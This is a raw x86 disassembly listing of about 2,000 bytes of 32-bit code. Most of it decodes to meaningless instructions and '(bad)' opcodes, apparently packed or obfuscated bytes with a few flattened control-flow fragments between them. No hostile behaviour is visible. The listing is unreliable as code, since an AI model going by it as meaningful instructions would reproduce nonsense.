  4040f6:	sbb    BYTE PTR [edi+0x70],bh
  4040f9:	jo     0x40407d
  4040fb:	push   0x31
  4040fd:	inc    DWORD PTR [eax-0x55cddf22]
  404103:	test   BYTE PTR [eax],al
  404105:	fidiv  DWORD PTR [ebx]
  404107:	sbb    BYTE PTR [eax-0x43],al
  40410a:	dec    ecx
  40410b:	xchg   esi,eax
  40410c:	mov    eax,ds:0x89fbdd62
  404111:	jl     0x404163
  404113:	js     0x4040d5
  404115:	test   eax,0x9f5b6299
  40411a:	xchg   esi,eax
  40411b:	push   ebx
  40411c:	cmp    eax,0x3f59671
  404121:	out    dx,al
  404122:	stos   DWORD PTR es:[edi],eax
  404123:	jne    0x4040a8
  404125:	and    ch,al
  404127:	push   0x70
  404129:	pop    edi
  40412a:	inc    edx
  40412b:	iret   
  40412c:	mov    bh,0x6c
  40412e:	fs cmp eax,0x51589322
  404134:	aad    0x3d
  404136:	sbb    DWORD PTR [edx],0xa689ec57
  40413c:	xchg   esi,eax
  40413d:	retf   0x47c6
  404140:	and    al,0x67
  404142:	clc    
  404143:	leave  
  404144:	cmp    DWORD PTR [eax],edx
  404146:	gs mov dl,0x56
  404149:	inc    edi
  40414a:	lahf   
  40414b:	or     BYTE PTR [ecx],0x88
  40414e:	es jle 0x404177
  404151:	fistp  WORD PTR [ecx+0x2a]
  404154:	loopne 0x4041d4
  404156:	xor    al,0x21
  404158:	sbb    al,0x81
  40415a:	and    ah,al
  40415c:	pop    ds
  40415d:	bound  ecx,QWORD PTR [esi+eax*1]
  404160:	fistp  DWORD PTR [edx+0x77]
  404163:	sbb    dl,cl
  404165:	inc    edx
  404166:	or     esi,DWORD PTR [ecx]
  404168:	cld    
  404169:	jmp    0xa9e9c718
  40416e:	sbb    BYTE PTR [ebp-0x4a],ah
  404171:	lea    edi,[edi]
  404173:	jae    0x4041d4
  404175:	jecxz  0x4041d5
  404177:	fild   WORD PTR [eax+0x1a]
  40417a:	cmp    al,cl
  40417c:	clc    
  40417d:	mov    ebp,0x8a97975d
  404182:	sbb    esp,DWORD PTR ds:0x56c03174
  404188:	dec    esp
  404189:	stos   BYTE PTR es:[edi],al
  40418a:	adc    esi,DWORD PTR [eax-0x5c]
  40418d:	mov    edx,0x6c755056
  404192:	mov    WORD PTR [edi-0x436e6561],ds
  404198:	adc    cl,ch
  40419a:	add    al,0x15
  40419c:	fucom  st(2)
  40419e:	inc    edx
  40419f:	xchg   esi,eax
  4041a0:	jno    0x4041f0
  4041a2:	mov    DWORD PTR [ebp+0x15],ecx
  4041a5:	jle    0x404187
  4041a7:	xchg   DWORD PTR [esi],edx
  4041a9:	jo     0x4041d8
  4041ab:	pusha  
  4041ac:	pushf  
  4041ad:	add    BYTE PTR [eax+eiz*2+0x14],ah
  4041b1:	es icebp 
  4041b3:	push   ss
  4041b4:	jmp    0x4041c8
  4041b6:	push   0x7787e749
  4041bb:	pop    es
  4041bc:	mov    dh,0x75
  4041be:	dec    ebx
  4041bf:	iret   
  4041c0:	pop    edx
  4041c1:	push   esp
  4041c2:	fdivr  DWORD PTR [eax]
  4041c4:	add    ah,BYTE PTR [ebx-0x3b]
  4041c7:	dec    esi
  4041c8:	rcl    DWORD PTR [esi-0x59],cl
  4041cb:	stc    
  4041cc:	xor    al,0x77
  4041ce:	fild   WORD PTR [ebp-0x4]
  4041d1:	out    0x75,eax
  4041d3:	pop    ss
  4041d4:	jno    0x404252
  4041d6:	jg     0x404169
  4041d8:	in     al,0x7c
  4041da:	ret    
  4041db:	dec    esp
  4041dc:	mov    ecx,0xded2d817
  4041e1:	in     al,0x18
  4041e3:	push   esi
  4041e4:	mov    ebx,0xb31a816
  4041e9:	test   BYTE PTR [ebx-0x2cec5bee],bl
  4041ef:	push   ebx
  4041f0:	call   0x7527:0xb6a048cd
  4041f7:	ins    DWORD PTR es:[edi],dx
  4041f8:	scas   al,BYTE PTR es:[edi]
  4041f9:	mov    dh,0x3e
  4041fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041fc:	cmp    BYTE PTR [ecx-0x3f515a22],al
  404202:	jno    0x4041be
  404204:	sbb    BYTE PTR fs:[edi+0x2a8fd6b],ch
  40420b:	mov    cl,0xc7
  40420d:	dec    ebp
  40420e:	aas    
  40420f:	test   bh,ch
  404211:	pop    ebp
  404212:	or     eax,0x446ccfb
  404217:	test   dh,cl
  404219:	mul    ebx
  40421b:	and    ch,BYTE PTR [esi-0x3b]
  40421e:	shl    DWORD PTR [ecx],1
  404220:	call   0x4017531
  404225:	(bad)  
  404226:	mov    DWORD PTR [edx],eax
  404228:	mov    eax,DWORD PTR [ebp-0x8]
  40422b:	xor    eax,ecx
  40422d:	add    eax,esi
  40422f:	jmp    0x404374
  404234:	ffree  st(0)
  404236:	adc    BYTE PTR [ecx+esi*4-0x168e12ae],0xf2
  40423e:	mov    esi,0xe2899e35
  404243:	push   0x34
  404245:	sbb    BYTE PTR [eax+0x70],dh
  404248:	sbb    BYTE PTR [edi+0x70],bh
  40424b:	jo     0x4041e8
  40424d:	jbe    0x40423b
  40424f:	mov    esp,0xdec53860
  404254:	cmp    bh,BYTE PTR [esi-0x71e87417]
  40425a:	stos   BYTE PTR es:[edi],al
  40425b:	mov    dl,al
  40425d:	shl    BYTE PTR fs:[edi+0xd],0xfa
  404262:	popw   es
  404264:	dec    ecx
  404265:	or     edi,edx
  404267:	std    
  404268:	ins    DWORD PTR es:[edi],dx
  404269:	xor    al,0xcc
  40426b:	sbb    al,0x9f
  40426d:	aad    0xfe
  40426f:	inc    edx
  404270:	xchg   ebx,eax
  404271:	scas   eax,DWORD PTR es:[edi]
  404272:	int    0xf7
  404274:	add    dh,BYTE PTR [esi+0x5d]
  404277:	sahf   
  404278:	jmp    0x21de:0x2f0d33be
  40427f:	add    eax,0xc70b4fe7
  404284:	dec    esi
  404285:	ret    0xc2e5
  404288:	loop   0x40428c
  40428a:	je     0x4042c2
  40428c:	leave  
  40428d:	mov    esp,0x3e5ce967
  404292:	xor    edx,DWORD PTR [eax]
  404294:	sub    edi,esi
  404296:	out    dx,al
  404297:	aad    0x27
  404299:	add    DWORD PTR ds:0x59a60625,0xffffffa9
  4042a0:	add    eax,DWORD PTR [edx]
  4042a2:	stos   DWORD PTR es:[edi],eax
  4042a3:	ret    0x9791
  4042a6:	stos   DWORD PTR es:[edi],eax
  4042a7:	cmp    edx,edi
  4042a9:	sub    dl,cl
  4042ab:	xchg   ebp,eax
  4042ac:	ss popf 
  4042ae:	clc    
  4042af:	test   ch,cl
  4042b1:	mov    ds:0x974a5f6,eax
  4042b6:	cmp    BYTE PTR [edx+eiz*4+0x5c],dl
  4042ba:	push   0x7d35426b
  4042bf:	dec    ebp
  4042c0:	imul   edx,DWORD PTR [esi-0x68],0x67b98f7c
  4042c7:	fsub   QWORD PTR [ebx+0x59]
  4042ca:	mov    BYTE PTR [ebx+0x60],ah
  4042cd:	out    0xd0,al
  4042cf:	mov    ah,0x2f
  4042d1:	add    eax,0x9e6b3053
  4042d6:	stc    
  4042d7:	shl    BYTE PTR [ebp-0xd],cl
  4042da:	(bad)  
  4042db:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4042dd:	ds push esp
  4042df:	shl    al,0x50
  4042e2:	aam    0x78
  4042e4:	sbb    cl,BYTE PTR [edx-0xd0512a3]
  4042ea:	popa   
  4042eb:	cdq    
  4042ec:	arpl   WORD PTR [esi+eax*4],cx
  4042ef:	inc    eax
  4042f0:	mov    cl,0x3f
  4042f2:	push   edx
  4042f3:	jmp    0x40431d
  4042f5:	fdivr  st(6),st
  4042f7:	and    DWORD PTR [esi+edi*1-0x3f],ebx
  4042fb:	cmc    
  4042fc:	fcom   DWORD PTR ds:0xe4e12223
  404302:	addr16 dec esi
  404304:	test   ebp,edx
  404306:	jecxz  0x4042dc
  404308:	jle    0x40434b
  40430a:	stos   BYTE PTR es:[edi],al
  40430b:	(bad)  
  40430c:	push   cs
  40430d:	int    0x39
  40430f:	sti    
  404310:	(bad)  
  404311:	aad    0x1b
  404313:	test   eax,0xbf8a05b3
  404318:	cdq    
  404319:	aas    
  40431a:	(bad)  
  40431c:	outs   dx,BYTE PTR ds:[esi]
  40431d:	xor    eax,DWORD PTR [esi+edx*4]
  404320:	(bad)
  404323:	mov    cl,0xe
  404325:	jmp    0xde35:0xffe44f02
  40432c:	js     0x40433b
  40432e:	(bad)  
  40432f:	das    
  404330:	or     BYTE PTR [ecx-0x37f37bfb],dl
  404336:	inc    ebx
  404337:	mov    edx,ds
  404339:	pushf  
  40433a:	aas    
  40433b:	bnd jb 0x40434b
  40433e:	out    0x3e,eax
  404340:	out    dx,al
  404341:	jl     0x404384
  404343:	stos   DWORD PTR es:[edi],eax
  404344:	xchg   esi,eax
  404345:	dec    esp
  404346:	lods   al,BYTE PTR ds:[esi]
  404347:	mov    bh,0x29
  404349:	loopne 0x4042e4
  40434b:	xchg   edi,eax
  40434c:	ins    DWORD PTR es:[edi],dx
  40434d:	or     ebp,DWORD PTR [edi+ecx*8-0x2e]
  404351:	neg    BYTE PTR gs:[ecx-0x28f8ab53]
  404358:	jg     0x4042e8
  40435a:	sbb    al,ah
  40435c:	aas    
  40435d:	adc    eax,0x8ef7070f
  404362:	adc    ch,cl
  404364:	mov    ecx,0xef9dfcdf
  404369:	xchg   DWORD PTR [eax],ecx
  40436b:	(bad)  
  40436c:	call   0xfc498517
  404371:	pop    ebp
  404372:	clc    
  404373:	inc    edi
  404374:	mov    DWORD PTR [ebp+0x8],eax
  404377:	mov    eax,DWORD PTR [ebp+0x8]
  40437a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40437e:	mov    dl,BYTE PTR [ebp-0x1]
  404381:	cmp    al,dl
  404383:	je     0x4048da
  404389:	mov    eax,DWORD PTR [ebp+0x8]
  40438c:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404390:	jmp    0x4044d5
  404395:	scas   al,BYTE PTR es:[edi]
  404396:	or     al,0x38
  404398:	repz (bad) 
  40439b:	test   eax,0x35388951
  4043a0:	sar    edx,cl
  4043a2:	pop    ebx
  4043a3:	mov    esp,0x7027dcb0
  4043a8:	jo     0x4043c2
  4043aa:	jg     0x40441c
  4043ac:	jo     0x404336
  4043ae:	and    al,0x9b
  4043b0:	int3   
  4043b1:	and    DWORD PTR [edi],eax
  4043b3:	leave  
  4043b4:	mov    edi,0xfc773250
  4043b9:	loop   0x4043d5
  4043bb:	inc    esi
  4043bc:	repnz loopne 0x40442d
  4043bf:	bound  eax,QWORD PTR [eax]
  4043c1:	wbinvd 
  4043c3:	shl    cl,0x24
  4043c6:	jbe    0x404416
  4043c8:	inc    eax
  4043c9:	sub    eax,0x1b521c3d
  4043ce:	xchg   ebx,eax
  4043cf:	push   ss
  4043d0:	sub    cl,ch
  4043d2:	pop    edx
  4043d3:	mov    ds:0xf4f2f74c,al
  4043d8:	mov    eax,ds:0xf02ddf61
  4043dd:	xchg   DWORD PTR [eax-0x412cbf0f],esp
  4043e3:	(bad)  
  4043e5:	pop    ecx
  4043e6:	or     edx,DWORD PTR [edx+ebp*1+0x26b07d8d]
  4043ed:	xor    DWORD PTR [ebx+edi*2+0x31a0fb4d],esi
  4043f4:	xchg   ebx,eax
  4043f5:	mov    ?,WORD PTR [ecx*4-0x1b3a1ae9]
  4043fc:	pop    ss
  4043fd:	mov    ch,0xec
  4043ff:	jnp    0x40438c
  404401:	(bad)  
  404403:	push   ebx
  404404:	in     eax,dx
  404405:	mov    esi,ecx
  404407:	mov    ebp,0xaf0f7129
  40440c:	and    al,0x7
  40440e:	push   edx
  40440f:	jno    0x40443d
  404411:	pop    edi
  404412:	jae    0x4043d7
  404414:	sub    ebp,esp
  404416:	daa    
  404417:	pusha  
  404418:	add    ecx,ecx
  40441a:	push   edi
  40441b:	clc    
  40441c:	out    0x91,al
  40441e:	das    
  40441f:	hlt    
  404420:	pop    esp
  404421:	neg    DWORD PTR [ebp+0x76]
  404424:	in     eax,dx
  404425:	sahf   
  404426:	repz mov ecx,0x8fca33b0
  40442c:	iret   
  40442d:	int3   
  40442e:	ss adc al,0x52
  404431:	stos   DWORD PTR es:[edi],eax
  404432:	cmp    al,0x37
  404434:	xchg   ch,al
  404436:	ret    0xe152
  404439:	adc    ebp,DWORD PTR [edi+0x30]
  40443c:	dec    edi
  40443d:	gs push edi
  40443f:	repnz mov esi,0x2c2e4f90
  404445:	les    ecx,FWORD PTR [ebp+0x36]
  404448:	das    
  404449:	ss stc 
  40444b:	mov    esi,0x963e0335
  404450:	fsub   QWORD PTR ds:0xfc1b2c19
  404456:	mov    al,ds:0x35ff3138
  40445b:	stos   DWORD PTR es:[edi],eax
  40445c:	push   0xffffff85
  40445e:	(bad)  
  40445f:	push   esp
  404460:	test   BYTE PTR [edi],cl
  404462:	out    dx,eax
  404463:	repnz dec ecx
  404465:	push   eax
  404466:	test   DWORD PTR [ecx],eax
  404468:	gs cmp cl,bl
  40446b:	xchg   ecx,eax
  40446c:	lock jns 0x404428
  40446f:	push   ebx
  404470:	nop
  404471:	sbb    DWORD PTR [ecx-0x56c84bb7],0xffffffff
  404478:	rol    DWORD PTR [esi],1
  40447a:	fs (bad) 
  40447c:	rol    DWORD PTR [esi-0x34],cl
  40447f:	push   0xf96914e0
  404484:	ja     0x404442
  404486:	repz cmp DWORD PTR [edx-0x4fef40ec],esp
  40448d:	jbe    0x404470
  40448f:	xchg   esi,eax
  404490:	das    
  404491:	mov    al,ds:0xdb412efb
  404496:	jmp    0x404438
  404498:	inc    eax
  404499:	add    al,0xce
  40449b:	in     eax,0x30
  40449d:	pop    eax
  40449e:	pusha  
  40449f:	dec    ecx
  4044a0:	shr    bh,1
  4044a2:	mov    ah,0x76
  4044a4:	dec    ecx
  4044a5:	inc    esp
  4044a6:	sub    dl,BYTE PTR [ebx-0x132baf8d]
  4044ac:	jns    0x40449f
  4044ae:	inc    edx
  4044af:	retf   0x56f8
  4044b2:	(bad)  
  4044b3:	pop    esi
  4044b4:	pop    edx
  4044b5:	lea    edx,[eax+0x3b6a159]
  4044bb:	push   edx
  4044bc:	xor    al,0x46
  4044be:	sti    
  4044bf:	int    0x6a
  4044c1:	mov    dh,0xb7
  4044c3:	in     al,0xf7
  4044c5:	nop
  4044c6:	inc    esp
  4044c7:	dec    ebx
  4044c8:	sub    eax,0x2a4dbd59
  4044cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044ce:	or     eax,0x69bee68a
  4044d3:	ins    BYTE PTR es:[edi],dx
  4044d4:	jne    0x404461
  4044d6:	push   ebp
  4044d7:	or     al,0x3a
  4044d9:	add    cl,BYTE PTR [edi]
  4044db:	test   edi,ebp
  4044dd:	pop    es
  4044de:	add    BYTE PTR [eax],al
  4044e0:	mov    eax,DWORD PTR [ebp-0x8]
  4044e3:	jmp    0x404628
  4044e8:	dec    edi
  4044e9:	push   edx
  4044ea:	test   ebx,esi
  4044ec:	xor    ebx,0x16807269
  4044f2:	popa   
  4044f3:	jns    0x40449c
  4044f5:	pop    ecx
  4044f6:	outs   dx,BYTE PTR ds:[esi]
  4044f7:	dec    edx
  4044f8:	test   BYTE PTR [esi],ah
  4044fa:	jo     0x40456c
  4044fc:	sbb    BYTE PTR [edi+0x70],bh
  4044ff:	jo     0x404553
  404501:	pop    ds
  404502:	xlat   BYTE PTR ds:[ebx]
  404503:	xchg   DWORD PTR [edi],ebp
  404505:	je     0x404563
  404507:	and    dh,bl
  404509:	jl     0x404546
  40450b:	in     al,0x99
  40450d:	and    dh,ch
  40450f:	out    dx,eax
  404510:	inc    esp
  404511:	jecxz  0x404518
  404513:	sbb    esi,DWORD PTR [esi+0x7de2b074]
  404519:	(bad)  
  40451a:	xchg   edi,eax
  40451b:	inc    esp
  40451c:	das    
  40451d:	cdq    
  40451e:	inc    edi
  40451f:	inc    DWORD PTR [edi]
  404521:	nop
  404522:	mov    edx,0x68a433ab
  404527:	sahf   
  404528:	sbb    esi,edi
  40452a:	inc    ecx
  40452b:	xchg   DWORD PTR [ebx+0x74],edx
  40452e:	push   cs
  40452f:	ror    edi,0x76
  404532:	dec    esp
  404533:	inc    ebx
  404534:	mov    ds:0x5b196a5b,al
  404539:	imul   esi,DWORD PTR [esi+0x1716866b],0x2612d6b5
  404543:	inc    esp
  404544:	ret    0x1795
  404547:	mov    esi,0x6bde2103
  40454c:	or     eax,0xc4d3ef5b
  404551:	leave  
  404552:	repz or dl,BYTE PTR ss:[eax-0x4713e820]
  40455a:	xor    cl,BYTE PTR ds:0x1d8f1269
  404560:	mov    ah,0x17
  404562:	mov    eax,ds:0xc3f7213f
  404567:	ror    bh,0x3
  40456a:	or     BYTE PTR [eax-0x6],bh
  40456d:	das    
  40456e:	push   ebp
  40456f:	and    al,0x8a
  404571:	cmp    bh,dl
  404573:	inc    ebx
  404574:	lahf   
  404575:	ror    DWORD PTR [ebx-0x3f2dc003],0x2b
  40457c:	daa    
  40457d:	add    ch,BYTE PTR [ebp-0x50871405]
  404583:	push   edi
  404584:	lods   eax,DWORD PTR gs:[esi]
  404586:	mov    ebx,0x2833392
  40458b:	xor    edx,ebx
  40458d:	stc    
  40458e:	inc    ecx
  40458f:	(bad)  
  404590:	dec    edx
  404591:	cmc    
  404592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404593:	ss cmp eax,0x73162144
  404599:	in     eax,0xbd
  40459b:	fcom   DWORD PTR [edx+ebx*1]
  40459e:	push   ecx
  40459f:	mov    ebx,0x65da8c91
  4045a4:	iret   
  4045a5:	mov    ah,0x3
  4045a7:	xchg   DWORD PTR [edx+0x62],ecx
  4045aa:	enter  0x54c7,0xa8
  4045ae:	xchg   DWORD PTR [ebx+0x12],edi
  4045b1:	xchg   ebx,eax
  4045b2:	stos   DWORD PTR es:[edi],eax
  4045b3:	xchg   ebp,eax
  4045b4:	push   cs
  4045b5:	push   0x15
  4045b7:	jecxz  0x404632
  4045b9:	(bad)  
  4045ba:	es add ah,al
  4045bd:	xor    BYTE PTR [ebx+0x2c],dh
  4045c0:	out    dx,eax
  4045c1:	adc    ch,0xd0
  4045c4:	out    0x49,eax
  4045c6:	jmp    0x4045d5
  4045c8:	(bad)  
  4045c9:	push   ebx
  4045ca:	popa   
  4045cb:	add    ebx,DWORD PTR [esi+0x3c]
  4045ce:	push   ecx
  4045cf:	xor    BYTE PTR [eax],cl
  4045d1:	pop    esi
  4045d2:	lods   eax,DWORD PTR ds:[esi]
  4045d3:	cwde   
  4045d4:	fist   WORD PTR [esp+ebp*8-0x7e]
  4045d8:	test   eax,0x275a8366
  4045dd:	loopne 0x40464d
  4045df:	push   edi
  4045e0:	aaa    
  4045e1:	push   edx
  4045e2:	jmp    edx
  4045e4:	add    eax,0x4478a982
  4045e9:	sti    
  4045ea:	jmp    0x404643
  4045ec:	jl     0x40465d
  4045ee:	bound  ebx,QWORD PTR [edi+ebp*4-0x451eda78]
  4045f5:	sbb    eax,0xe9095b16
  4045fa:	or     BYTE PTR [edi],ah
  4045fc:	inc    ecx
  4045fd:	imul   esp,DWORD PTR [edx],0x7a572fef
  404603:	mov    bh,cl
  404605:	inc    edx
  404606:	pop    ds
  404607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40460a:	pop    ebp
  40460b:	pop    esi
  40460c:	repnz test al,0x8a
  40460f:	in     eax,0x2e
  404611:	push   es
  404612:	xchg   DWORD PTR [esi],ebp
  404614:	push   ebx
  404615:	dec    ebp
  404616:	dec    esp
  404617:	jp     0x4045f3
  404619:	or     al,0x67
  40461b:	add    ch,cl
  40461d:	mov    bh,0xa4
  40461f:	sbb    DWORD PTR fs:[eax+0x1],eax
  404623:	icebp  
  404624:	cli    
  404625:	test   eax,0x558b7720
  40462a:	or     al,0xf
  40462c:	mov    esi,0x3c13312
  404631:	(bad)  
  404632:	cmp    edx,eax
  404634:	jmp    0x404779
  404639:	mov    edi,0x915e91cc
  40463e:	gs jae 0x40462a
  404641:	nop
  404642:	sbb    eax,0x17d56c86
  404647:	jno    0x404614
  404649:	lods   al,BYTE PTR ds:[esi]
  40464a:	and    eax,0x7f187070
  40464f:	jo     0x4046c1
  404651:	fs add al,0xa3
  404654:	dec    eax
  404655:	aam    0x46
  404657:	scas   eax,DWORD PTR es:[edi]
  404658:	ja     0x40467b
  40465a:	xlat   BYTE PTR ds:[ebx]
  40465b:	inc    ecx
  40465c:	imul   eax,DWORD PTR [esi+0x7],0x74
  404660:	inc    esp
  404661:	push   edi
  404662:	push   esi
  404663:	push   0xecafa527
  404668:	rcr    ch,0xf
  40466b:	jmp    0x1f12:0x6d7f2819
  404672:	sbb    bl,BYTE PTR [esp+edi*2+0x5909b5eb]
  404679:	scas   al,BYTE PTR es:[edi]
  40467a:	mov    ecx,0x9aaf09b4
  40467f:	sub    DWORD PTR [ebp-0x10b4c881],edi
  404685:	cmp    al,0xca
  404687:	push   es
  404688:	pop    ebx
  404689:	inc    ebp
  40468a:	mov    bl,0x23
  40468c:	xor    al,0x16
  40468e:	out    0x7,eax
  404690:	into   
  404691:	les    esi,FWORD PTR [edi-0x1276fce]
  404697:	leave  
  404698:	mov    dh,BYTE PTR ss:[ebx-0x7a9237b6]
  40469f:	xor    BYTE PTR [edx],al
  4046a1:	loop   0x40468c
  4046a3:	push   ebp
  4046a4:	fsubr  DWORD PTR [edi+0x2b]
  4046a7:	enter  0xd241,0x80
  4046ab:	inc    ebx
  4046ac:	lods   al,BYTE PTR ds:[esi]
  4046ad:	dec    ebp
  4046ae:	cmp    eax,0x9d62c12d
  4046b3:	mov    ds:0x9038c2b0,eax
  4046b8:	mov    ah,0xb3
  4046ba:	loopne 0x404697
  4046bc:	ins    DWORD PTR es:[edi],dx
  4046bd:	push   0xffffffae
  4046bf:	aas    
  4046c0:	pop    edi
  4046c1:	xor    al,0xfc
  4046c3:	cwde   
  4046c4:	sbb    ch,ch
  4046c6:	iret   
  4046c7:	retf   0x6c1
  4046ca:	dec    edi
  4046cb:	outs   dx,BYTE PTR ds:[esi]
  4046cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046cd:	out    0x97,al
  4046cf:	sbb    DWORD PTR [edx+0x21],ebx
  4046d2:	mov    dl,0xec
  4046d4:	fidivr DWORD PTR [edx-0x59]
  4046d7:	jle    0x4046df
  4046d9:	pop    edi
  4046da:	cwde   
  4046db:	imul   ebp,DWORD PTR [eax-0x2f],0xffffffee
  4046df:	dec    esi
  4046e0:	inc    ebp
  4046e1:	shl    DWORD PTR [eax-0x27],1
  4046e4:	inc    edi
  4046e5:	sti    
  4046e6:	sbb    DWORD PTR [ebx],ebx
  4046e8:	(bad)  
  4046e9:	stos   DWORD PTR es:[edi],eax
  4046ea:	jl     0x4046ac
  4046ec:	shl    BYTE PTR [eax],1
  4046ee:	daa    
  4046ef:	pop    ss
  4046f0:	popf   
  4046f1:	lds    eax,FWORD PTR [ebx-0x62]
  4046f4:	sbb    eax,DWORD PTR [ebp-0x65e72f87]
  4046fa:	gs push edi
  4046fc:	mov    eax,0x6d1030bd
  404701:	and    dl,cl
  404703:	mov    ds:0xf3109423,eax
  404708:	inc    esp
  404709:	and    cl,BYTE PTR [ebx]
  40470b:	outs   dx,BYTE PTR ds:[esi]
  40470c:	jmp    0xc6f7310b
  404711:	jmp    0xf6bc:0x94902eab
  404718:	mov    al,0xaa
  40471a:	lahf   
  40471b:	push   ebp
  40471c:	outs   dx,DWORD PTR ds:[esi]
  40471d:	clc    
  40471e:	(bad)  
  40471f:	ds xor eax,0xfbc2ed63
  404725:	xchg   ebx,eax
  404726:	xchg   edx,eax
  404727:	jecxz  0x404744
  404729:	cmp    cl,cl
  40472b:	push   es
  40472c:	jmp    0xa8dc:0x63a49d9a
  404733:	push   ss
  404734:	call   0xfb07cda3
  404739:	arpl   si,dx
  40473b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40473c:	dec    ebp
  40473d:	out    0xce,eax
  40473f:	xor    DWORD PTR [esi+0x601382a9],ecx
  404745:	mov    dl,bh
  404747:	add    BYTE PTR [edx+0x1a],al
  40474a:	push   ds
  40474b:	stos   BYTE PTR es:[edi],al
  40474c:	enter  0xdc8e,0x60
  404750:	inc    edi
  404751:	sbb    bh,al
  404753:	fsubr  QWORD PTR [edi+0x62]
  404756:	shr    ah,1
  404758:	pop    edi
  404759:	repz push esi
  40475b:	loopne 0x40477b
  40475d:	jl     0x40475a
  40475f:	adc    DWORD PTR [ebx-0x7a170c88],esi
  404765:	je     0x4047c1
  404767:	dec    esp
  404768:	mov    eax,0x5ec6cd4a
  40476d:	xor    bh,BYTE PTR [ebp-0x79dfac1e]
  404773:	jne    0x4047ee
  404775:	adc    cl,BYTE PTR ds:0x840f1c08
  40477b:	inc    DWORD PTR [ebx]
  40477d:	add    BYTE PTR [eax],al
  40477f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  404786:	jmp    0x4048cb
  40478b:	aaa    
  40478c:	dec    ebp
  40478d:	rcr    DWORD PTR [edi],cl
  40478f:	jno    0x404732
  404791:	repz push ebp
  404793:	enter  0x209d,0xec
  404797:	inc    edx
  404798:	fimul  WORD PTR [edi]
  40479a:	push   ebx
  40479b:	push   esp
  40479c:	and    al,0x70
  40479e:	jo     0x4047b8
  4047a0:	jg     0x404812
  4047a2:	jo     0x4047ed
  4047a4:	mov    eax,ds:0xfd983d08
  4047a9:	xchg   DWORD PTR [esi-0x4a],ebx
  4047ac:	or     eax,0x4bfff762
  4047b1:	adc    al,0x43
  4047b3:	loopne 0x404737
  4047b5:	bsr    esi,esi
  4047b8:	mov    al,0x5
  4047ba:	mov    esp,0xadc48dfe
  4047bf:	mov    ebx,0x64477f0c
  4047c4:	mov    edx,0x7d2c6345
  4047c9:	mov    al,ds:0x4de3dcd8
  4047ce:	pop    es
  4047cf:	jae    0x40481e
  4047d1:	mov    eax,ds:0xbf10fc49
  4047d6:	jecxz  0x404790
  4047d8:	jae    0x404809
  4047da:	enter  0x36d9,0x42
  4047de:	or     eax,0xde52a8a0
  4047e3:	daa    
  4047e4:	jecxz  0x4047e6
  4047e6:	loope  0x4047dd
  4047e8:	in     al,0x5b
  4047ea:	data16 repz repnz cmp dh,BYTE PTR fs:[eax-0x12b63f41]
  4047f4:	imul   esp,ebp,0xa
  4047f7:	jne    0x404788
  4047f9:	mov    esi,DWORD PTR ds:[esi+0x7]
  4047fd:	cs out dx,al
  4047ff:	lock repz jmp FWORD PTR [bp+di+0x20a3]
  404806:	pop    ebp
  404807:	std    
  404808:	call   0xbfbe:0x582841b4
  40480f:	pusha  
  404810:	pop    edx
  404811:	(bad)  
  404813:	mov    BYTE PTR [edx],ch
  404815:	push   es
  404816:	ret    
  404817:	and    al,0x3c
  404819:	dec    ebx
  40481a:	(bad)  
  40481b:	mov    al,0x31
  40481d:	jmp    FWORD PTR [ecx+0x29]
  404820:	jecxz  0x4047cd
  404822:	ss cld 
  404824:	aas    
  404825:	mov    bl,0x78
  404827:	sbb    al,0x5
  404829:	lea    esi,[eax]
  40482b:	mov    ebx,eax
  40482d:	mov    edi,0x6d32ae5b
  404832:	jo     0x4047eb
  404834:	dec    ecx
  404835:	aaa    
  404836:	jp     0x40489a
  404838:	and    al,0x8d
  40483a:	xchg   ebp,eax
  40483b:	dec    esp
  40483c:	cld    
  40483d:	call   0x84cd9996
  404842:	xchg   esp,eax
  404843:	add    esi,DWORD PTR [esi]
  404845:	idiv   BYTE PTR [eax+0x7c5aca50]
  40484b:	add    BYTE PTR [edi+0x61fdadd0],0xff
  404852:	and    BYTE PTR [edx+0x79],bh
  404855:	imul   ebx,DWORD PTR [eax],0x3fc187d2
  40485b:	cmp    eax,0x1c936d1
  404860:	push   ss
  404861:	fistp  WORD PTR [ebx]
  404863:	push   ebx
  404864:	push   es
  404865:	lahf   
  404866:	scas   eax,DWORD PTR es:[edi]
  404867:	in     eax,0xdf
  404869:	scas   al,BYTE PTR es:[edi]
  40486a:	and    al,0xa0
  40486c:	lahf   
  40486d:	jle    0x4048ae
  40486f:	sahf   
  404870:	out    0x90,al
  404872:	dec    ebp
  404873:	adc    eax,ebp
  404875:	cmp    ecx,ebp
  404877:	sub    eax,0xc5f74891
  40487c:	jmp    0xe530:0xeaafe6c8
  404883:	push   ebp
  404884:	pop    es
  404885:	add    eax,DWORD PTR [eax-0x6c30633e]
  40488b:	clc    
  40488c:	mov    DWORD PTR [edi+0x4190a193],ebx
  404892:	popf   
  404893:	adc    DWORD PTR [edi],0xc69c0bee
  404899:	dec    esi
  40489a:	adc    DWORD PTR [ebx],0xffffffad
  40489d:	cwde   
  40489e:	and    ecx,ebp
  4048a0:	push   0xffffffb6
  4048a2:	out    dx,eax
  4048a3:	push   ss
  4048a4:	leave  
  4048a5:	test   eax,0x1034f96a
  4048aa:	je     0x404891
  4048ac:	and    al,0x4c
  4048ae:	inc    ecx
  4048af:	cmc    
  4048b0:	inc    esi
  4048b1:	arpl   WORD PTR [ebp+eiz*1+0x27],si
  4048b5:	xchg   dh,ch
  4048b7:	ror    BYTE PTR [ebx*4+0x5e7013e0],cl
  4048be:	mov    esp,0x661db1d9
  4048c3:	jae    0x40490a
  4048c5:	pop    esi
  4048c6:	into   
  4048c7:	retf   
  4048c8:	(bad)  
  4048c9:	mov    al,ds:0xe8458dd6
  4048ce:	mov    DWORD PTR [ebp-0x14],eax
  4048d1:	mov    eax,DWORD PTR [ebp-0x14]
  4048d4:	add    DWORD PTR [eax],0x705fa8f
  4048da:	mov    eax,DWORD PTR [ebp-0x10]
  4048dd:	mov    edx,DWORD PTR [ebp+0x8]
